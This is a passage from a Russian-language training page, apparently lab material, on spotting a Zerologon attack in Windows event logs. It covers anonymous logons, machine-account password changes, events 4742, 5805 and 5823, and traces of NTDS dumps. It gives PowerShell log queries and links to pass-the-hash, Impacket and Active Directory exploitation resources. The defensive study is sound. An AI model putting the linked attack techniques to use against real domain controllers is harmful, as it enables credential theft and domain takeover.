id="12e4a4c8-3fad-4b2e-86cf-89cd5a05ebe8" class="">Во-первых, ANONYMOUS LOGON - уже довольно подозрительный факт</p><hr id="0cd63eb7-faa0-4e19-b066-3f980e2fc0dc"/><p id="a3be8f81-0a59-4c79-9076-3bc9b8fc9633" class="">Ещё в логе можно увидеть заполненное поле password last set - это значит, что пароль был изменён. При легитимном взаимодействии пароль на машинной учетной записи может менять только NETWORK SERVICE. И, если это происходит, генерируется ещё одно событие с id 5823</p><hr id="6a998cd6-5c12-4862-98c1-bc3a2390c589"/><p id="84595f01-b80b-4455-8737-032c15ba41fa" class="">3.1 Найдём событие 5823 в журнале System с помощью фильтра</p><hr id="85cab67f-9622-4918-8e4d-58090392e536"/><figure id="ac90f072-9a66-44c9-8d7b-118b10c06037" class="image"><a href="https://i.imgur.com/MUhtJij.png"><img src="https://i.imgur.com/MUhtJij.png"/></a></figure><hr id="d627ceb9-d8e8-4945-ba8a-a74796f48326"/><p id="3a5818ab-eb8e-4ee7-9162-0f797cbf2333" class="">3.1 Событие есть, но оно произошло намного раньше</p><hr id="f331233f-8589-44f5-813a-fa6ef1017b9d"/><figure id="bbb05a22-0df7-4726-b486-48ad743947e2" class="image"><a href="https://i.imgur.com/cxO3dKi.png"><img src="https://i.imgur.com/cxO3dKi.png"/></a></figure><hr id="c2c748ae-b706-4b5d-bdca-e9c8d856ff08"/><p id="19436546-f7d7-4ef2-8c79-96473b31fccb" class="">Если поискать события 4742 за день, когда произошло 5823, то мы их найдём. Это легитимные события, связанные с введением в домен dc2</p><hr id="25ad4ed0-98b2-48bf-97ac-63270a95ffbe"/><p id="531c6c7b-f24e-4cfd-999c-403ee6d59ba2" class="">Можно искать события с помощью PowerShell:<br/><br/><code>Get-WinEvent –FilterHashTable @{LogName=’Security’;ID=4742}Get-WinEvent –FilterHashTable @{LogName=’System’;ID=5805}</code></p><p id="4d8e556e-e6cb-4eaf-8531-653f28609699" class="">3.1 Если происходит дамп NTDS, то можно увидеть данные выгрузки в журнале Direcrory Service</p><hr id="6f70447c-ae89-4f3f-bf7d-12d75b902693"/><figure id="5527ec81-17e3-4760-9725-8c1f3a9fb01b" class="image"><a href="https://i.imgur.com/ye0almX.png"><img src="https://i.imgur.com/ye0almX.png"/></a></figure><hr id="2b28cf68-3bf5-463c-8f07-43f89c4e170c"/><h2 id="ba08b6ed-06d9-4108-b5d7-4775f2c19faa" class="">Ссылки для закрепления материала и самостоятельного изучения:</h2><ul id="39054fc5-9bb9-434f-b54d-4c95fb14cd50" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/">Alternative ways to Pass the Hash</a></li></ul><ul id="b4c3580d-04c5-4b0b-a54f-9b591cdedb2b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/company/1cloud/blog/346466/">Как защитить ИТ-инфраструктуру: 7 базовых советов</a></li></ul><ul id="d29ab1c9-c1c8-47bc-b6e1-3d642c56d8e6" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/company/varonis/blog/507068/">Руководство по инструментарию управления Windows (WMI): основные сведения о WMI-атаках</a></li></ul><ul id="a9791fef-f330-4540-b074-f640564ca972" class="bulleted-list"><li style="list-style-type:disc"><a href="https://ab57.ru/cmdlist/wmic.html">WMIC — использование инструментария управления Windows (WMI) в командной строке.</a></li></ul><ul id="c0760765-d695-4750-ade0-2cf38ba1b28c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/company/varonis/blog/507068/">Основные сведения о WMI-атаках</a></li></ul><ul id="79a65785-978e-4576-b973-4675b7d31612" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/post/114150/">Хранение и шифрование паролей Microsoft Windows</a></li></ul><ul id="daf96a3f-658c-4dc6-8e6f-a0e26d02c98c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li></ul><ul id="f814017e-31ad-48c4-9f80-d8b410aa5e2b" class="bulleted-list"><li style="list-style-type:disc"><a href="https://defcon.ru/penetration-testing/18872/">Атаки на Active Directory (5 частей)</a></li></ul><ul id="c9b97857-e8f9-463e-bf9b-978113d77553" class="bulleted-list"><li style="list-style-type:disc"><a href="https://habr.com/ru/company/otus/blog/481348/">Пентест AD</a></li></ul><ul id="51d5bb83-4bb5-45f0-a2ff-eba5c37ac2d1" class="bulleted-list"><li style="list-style-type:disc"><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Примеры хешей для hashcat</a></li></ul><ul id="3022e22b-a10d-4795-9538-792dd080c046" class="bulleted-list"><li style="list-style-type:disc"><a href="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay">active directory exploitation</a></li></ul><ul id="2ad4d920-c0a5-4deb-895b-fed46df2ac1c" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.trendmicro.com/ru_ru/what-is/zerologon.html">What is Zerologon?</a></li></ul><ul id="00db8549-5dc9-4fba-8d9e-61c1551abe57" class="bulleted-list"><li style="list-style-type:disc"><a href="https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382">Hunting for zerologon</a></li></ul><ul id="3857c5f9-7f6b-447b-9586-83bbd0bf8d93" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.kb.cert.org/vuls/id/490028">Описание KB cert</a></li></ul><ul id="9718b3a8-8cf7-4313-9769-d3775c5842f2" class="bulleted-list"><li style="list-style-type:disc"><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/13db7494-6d2c-4448-be8f-cb5ba03e95d6">Учетные данные AES</a></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
